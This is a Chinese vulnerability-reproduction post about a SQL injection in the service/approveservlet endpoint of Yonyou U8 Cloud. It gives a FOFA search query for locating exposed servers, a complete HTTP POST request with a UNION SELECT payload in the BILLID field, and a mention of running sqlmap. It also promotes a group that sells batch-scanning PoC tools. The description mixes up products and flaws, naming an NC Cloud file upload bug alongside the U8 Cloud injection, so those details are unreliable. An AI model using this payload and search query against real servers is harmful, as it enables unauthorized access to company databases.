#  用友-U8-Cloud service/approveservlet接口存在SQL注入漏洞 附POC   
2024-11-11更新  南风漏洞复现文库   2024-11-11 22:01  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 用友-U8-Cloud 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。  
## 2.漏洞描述  
  
NC Cloud是用友推出的大型企业数字化平台。 用友网络科技股份有限公司NC Cloud存在任意文件上传漏洞，攻击者可利用该漏洞获取服务器控制权。用友-U8-Cloud service/approveservlet接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
用友NC Cloud  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3byNicDyQQIweUFgJEby0jDDFN3DJia8RD6K2x8oZdLcRrCDsbo9EOxmYuZGo0KtD99smYDNtyH776Q/640?wx_fmt=png&from=appmsg "null")  
  
用友-U8-Cloud service/approveservlet接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="/api/uclient/public/"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/service/approveservlet  
  
漏洞数据包：  
```
POST /service/approveservlet HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Length: 654
Content-Type: application/x-www-form-urlencoded

BILLID=1'%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20WPWZ&BILLTYPE=4331&USERID=3&RESULT=4&DATASOURCE=U8cloud
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byNicDyQQIweUFgJEby0jDDkCD0yePicnvTHjRjNQnNMGuAMhdV7Qq2tOoswfSiaE3TAhQNGclPdCwA/640?wx_fmt=jpeg&from=appmsg "null")  
  
跑sqlmap  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3byNicDyQQIweUFgJEby0jDDF2uCtdaWUqhAlWPu73zz8gfVyb0JqPNVRerwCwY3bJlppGU7f647tw/640?wx_fmt=png&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。  
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byNicDyQQIweUFgJEby0jDDBAoqUgsupIjQTlZxVoOYZ57C5lY32gfqq1S010kMfdCxgu0xM6FT0g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3byNicDyQQIweUFgJEby0jDDBI6EQmawia7mUISDGAzjibI63Cic6Y4DCiaoEf30ldqn1HedU98xRViavBQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byNicDyQQIweUFgJEby0jDDkRxdpTXuicJHCIYT8EklM6icqLda6mpicY63SgVvVIyibMHw2y87eibz0Sg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byNicDyQQIweUFgJEby0jDDjpX49bEEib39NO2GDy0XoaHBDaRErKfPncrdPuJhqVUDa0icIOjauErQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byNicDyQQIweUFgJEby0jDDhjATwQK0AbcmpBzmodr0EcllGNgf8uPbfibfy0QQj7nHhmW4SNK0nrg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3byNicDyQQIweUFgJEby0jDDic6Gl4qIAvSqLe8w8SiaqmOUCnA1yVT0PKbZxEh5DMzrty3Bib5WNAAQw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
厂商尚未提供漏洞修复方案，请关注厂商主页更新： https://www.yonyou.com/  
## 8.往期回顾  
  
  
[苹果IOS端IPA签名工具Sign.php接口存在任意命令执行漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487736&idx=1&sn=4865fc23b95914c8edf9a3f840699298&chksm=974b9dffa03c14e9dd6a87bd098a3462d4b0f201de69d6a2cbf2eaf621c301577746ce57a7ff&scene=21#wechat_redirect)  
  
  
[WordPress Time Clock插件存在远程代码执行漏洞CVE-2024-9593 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487724&idx=1&sn=bc4ff16c25b5f725c98a97a4467bfe2f&chksm=974b9deba03c14fdf3b8211c78d4d6a2b68e420ccbdd16d2a10c9988fc9381d40bc9b683ed0d&scene=21#wechat_redirect)  
  
  
